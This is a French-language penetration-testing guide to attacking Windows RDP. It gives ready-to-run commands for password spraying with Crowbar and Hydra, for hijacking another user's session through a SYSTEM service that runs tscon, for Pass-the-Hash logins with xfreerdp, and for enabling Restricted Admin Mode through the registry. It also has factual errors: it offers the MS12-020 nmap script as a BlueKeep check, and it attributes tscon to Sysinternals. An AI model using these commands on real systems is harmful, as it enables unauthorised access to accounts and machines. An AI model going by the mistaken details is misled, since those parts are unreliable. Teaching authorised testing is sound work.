# Attaquer RDP

Le Remote Desktop Protocol (RDP) permet l'administration graphique à distance des systèmes Windows sur le port TCP 3389. Omniprésent dans les environnements d'entreprise, il constitue une cible de choix pour le password spray, le hijacking de session et le Pass-the-Hash. Des vulnérabilités critiques comme BlueKeep ont également montré que le protocole lui-même peut être exploité pour obtenir un RCE sans authentification.

## Pourquoi

RDP est l'un des services les plus exposés sur Internet, et il est systématiquement présent sur les machines Windows internes. Un accès RDP donne un contrôle graphique complet de la machine, ce qui est souvent nécessaire pour interagir avec des applications qui n'ont pas d'interface en ligne de commande. En pentest interne, compromettre une session RDP d'un administrateur de domaine peut donner un accès direct au contrôleur de domaine.

## Comment ça marche

### Énumération

```bash
# - Scan du service RDP
nmap -Pn -sCV -p3389 <IP_CIBLE>
```

Le scan Nmap avec les scripts par défaut révèle le hostname, le domaine, la version de Windows (via `rdp-ntlm-info`) et le certificat SSL. Ces informations permettent de cibler précisément les attaques.

### Password spray

RDP n'aime pas les connexions parallèles massives. Adapter le nombre de threads et le délai entre les tentatives.

{% tabs %}
{% tab title="Crowbar" %}
```bash
# - Password spray RDP avec Crowbar
crowbar -b rdp -s <IP_CIBLE>/32 -U utilisateurs.txt -c 'MotDePasse123!'
```
{% endtab %}
{% tab title="Hydra" %}
```bash
# - Password spray RDP avec Hydra
hydra -L utilisateurs.txt -p 'MotDePasse123!' <IP_CIBLE> rdp
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
RDP est particulièrement sensible au verrouillage de compte. Toujours vérifier la politique de verrouillage (via SMB ou d'autres moyens) avant de lancer un spray. Privilégier un spray lent avec peu de mots de passe candidats.
{% endhint %}

### Connexion RDP

Une fois les identifiants obtenus :

```bash
# - Connexion RDP avec xfreerdp
xfreerdp /v:<IP_CIBLE> /u:utilisateur /p:'MotDePasse' /cert-ignore

# - Avec résolution personnalisée
xfreerdp /v:<IP_CIBLE> /u:utilisateur /p:'MotDePasse' \
    /cert-ignore /w:1920 /h:1080
```

### Hijacking de session RDP

Si on dispose d'un accès admin local sur une machine où d'autres utilisateurs sont connectés en RDP, on peut détourner leur session sans connaître leur mot de passe.

Le principe : la commande `tscon` (Sysinternals) permet de basculer vers la session d'un autre utilisateur. Elle nécessite les droits `SYSTEM`.

```powershell
# - Lister les sessions actives
query user

# Exemple de sortie :
#  USERNAME          SESSIONNAME     ID  STATE
# >attaquant         rdp-tcp#13       1  Active
#  cible             rdp-tcp#14       2  Active
```

Pour obtenir les droits `SYSTEM`, créer un service Windows qui exécute `tscon` :

```powershell
# - Créer un service pour hijacker la session
sc.exe create hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

# - Démarrer le service
net start hijack
```

Le service s'exécute en tant que `SYSTEM`, ce qui permet au `tscon` de basculer vers la session de l'utilisateur cible. Un nouveau bureau s'ouvre avec le contexte de cet utilisateur.

{% hint style="info" %}
Cette technique ne fonctionne plus sur Windows Server 2019 et versions ultérieures. Elle reste viable sur Server 2012 R2 et Server 2016.
{% endhint %}

### RDP Pass-the-Hash

Il est possible de se connecter en RDP avec un hash NT au lieu du mot de passe en clair, via l'option `/pth` de xfreerdp :

```bash
# - Connexion RDP avec Pass-the-Hash
xfreerdp /v:<IP_CIBLE> /u:administrateur /pth:<HASH_NT> /cert-ignore
```

Cette technique nécessite que le **Restricted Admin Mode** soit activé sur la cible. Par défaut, il est désactivé. Si on dispose d'un accès (même non-RDP) à la machine, on peut l'activer via le registre :

```powershell
# - Activer le Restricted Admin Mode
reg add HKLM\System\CurrentControlSet\Control\Lsa \
    /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

{% hint style="warning" %}
Le Restricted Admin Mode change le comportement de l'authentification RDP : les identifiants ne sont pas envoyés au serveur distant. Cela protège contre le vol de credentials sur un serveur compromis, mais permet le PtH. C'est un compromis de sécurité que les administrateurs doivent évaluer.
{% endhint %}

### BlueKeep (CVE-2019-0708)

BlueKeep est une vulnérabilité de type Use-After-Free dans le service RDP, permettant un RCE sans authentification. Elle affecte Windows 7, Windows Server 2008 et Server 2008 R2.

Le vecteur d'attaque exploite la création de canaux virtuels pendant la négociation de la connexion RDP. Le service tourne avec les privilèges `SYSTEM`, ce qui donne un contrôle total en cas d'exploitation réussie.

{% hint style="danger" %}
L'exploitation de BlueKeep est instable et peut provoquer un écran bleu (BSoD) sur la cible. Toujours prévenir le client avant de tenter l'exploitation, et obtenir son accord explicite. En cas de doute, se contenter de confirmer la vulnérabilité via un scan sans exploitation.
{% endhint %}

```bash
# - Scanner pour BlueKeep (sans exploitation)
nmap -p3389 --script rdp-vuln-ms12-020 <IP_CIBLE>
```

## En pratique

```bash
# 1 - Scan RDP
nmap -Pn -sCV -p3389 <IP_CIBLE>

# 2 - Password spray prudent
crowbar -b rdp -s <IP_CIBLE>/32 -U utilisateurs.txt -c 'Saison2024!'

# 3 - Connexion avec identifiants valides
xfreerdp /v:<IP_CIBLE> /u:utilisateur /p:'MotDePasse' /cert-ignore

# 4 - Sur la session : lister les autres utilisateurs connectés
query user

# 5 - PtH si on a un hash admin
xfreerdp /v:<IP_CIBLE> /u:admin /pth:<HASH> /cert-ignore
```

## Pièges et galères

{% tabs %}
{% tab title="Connexion" %}
- **Certificat refusé** : ajouter `/cert-ignore` ou `/cert:ignore` pour contourner les erreurs de certificat auto-signé
- **Nombre max de sessions** : Windows limite le nombre de sessions RDP simultanées (2 par défaut sur Server, 1 sur les éditions Desktop). Si la limite est atteinte, la connexion est refusée
- **NLA (Network Level Authentication)** : si NLA est activé, l'authentification se fait avant l'ouverture de la session graphique. Cela empêche certaines attaques (comme BlueKeep) mais pas le password spray
{% endtab %}
{% tab title="PtH" %}
- **Restricted Admin Mode non activé** : sans cette clé de registre, le PtH RDP échoue avec un message d'erreur sur les restrictions de compte. Il faut un autre accès (WinRM, SMB, MSSQL) pour activer la clé
- **Comptes non-admin** : le PtH RDP ne fonctionne qu'avec des comptes membres du groupe Administrateurs local
{% endtab %}
{% endtabs %}

## Retour terrain

RDP est un vecteur d'entrée très fréquent, surtout quand il est exposé sur Internet. Le password spray avec des patterns saisonniers reste le vecteur le plus courant. Le hijacking de session est plus situationnel mais peut avoir un impact majeur en environnement AD (récupération d'une session d'admin de domaine).

Le PtH via RDP est une technique moins connue que le PtH via SMB, mais elle est précieuse quand on a besoin d'un accès graphique (applications spécifiques, navigation dans des interfaces web internes, etc.).

BlueKeep reste pertinent en 2024-2025 car de nombreux systèmes legacy (Windows 7, Server 2008 R2) sont encore en production, notamment dans les secteurs de la santé et de l'industrie.

## Mémo express

| Technique | Outil / Commande | Prérequis |
|---|---|---|
| Scan RDP | `nmap -sCV -p3389` | Port ouvert |
| Password spray | `crowbar -b rdp`, `hydra rdp://` | Liste d'utilisateurs |
| Connexion | `xfreerdp /v: /u: /p:` | Identifiants valides |
| Session hijacking | `tscon <ID> /dest:<session>` via service SYSTEM | Admin local + Windows < 2019 |
| Pass-the-Hash | `xfreerdp /pth:<hash>` | Restricted Admin Mode activé |
| BlueKeep scan | `nmap --script rdp-vuln-ms12-020` | Win7 / Server 2008 R2 |

***
